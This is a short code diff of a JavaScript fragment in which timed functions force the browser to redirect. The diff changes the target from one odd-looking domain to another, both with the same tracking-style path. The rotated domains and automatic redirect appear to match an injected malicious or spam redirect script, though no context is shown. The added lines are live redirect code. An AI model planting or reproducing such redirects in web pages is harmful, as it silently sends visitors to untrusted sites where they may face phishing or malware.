@@ -4,8 +4,8 @@
         fh();}
     setTimeout('hh();', 500);
     function fh(){
-        location.href="https://webbed-leadership.com/4vBTUM";
+        location.href="https://smoggyfeed.com/4vBTUM";
     }
     function goon(){
-        location.href="https://webbed-leadership.com/4vBTUM";
+        location.href="https://smoggyfeed.com/4vBTUM";
     }
